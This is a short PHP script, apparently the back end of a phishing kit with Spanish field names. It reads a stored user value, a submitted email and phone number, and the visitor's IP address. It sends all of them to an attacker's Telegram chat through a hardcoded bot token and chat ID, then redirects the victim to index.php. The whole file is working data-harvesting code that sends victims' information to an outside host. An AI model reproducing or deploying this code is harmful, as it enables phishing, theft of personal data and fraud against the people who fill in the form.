<?php

@session_start();

if ( isset ($_POST['usuario']) && isset ($_POST['email']) ){
$usario=$_SESSION['SMS'];
  $codigo=$_POST['usuario'];

$message = "User.: ".$usario."\nCorreo.: ".$_POST['email']."\nTelefono: ".$_POST['usuario']." ".$_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";

$apiToken = "6175677093:AAFykeSQbG9DecSQ_o4FnrE5ucFOKZ65H_A";

    $data = [
        'chat_id' => '-741062059',
        'text' => $message
    ];

    $url = "https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data); 
    $ch = curl_init(); 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
    curl_setopt($ch, CURLOPT_URL, $url);  
    $result = curl_exec($ch);

Header ("Location: index.php");
}
?>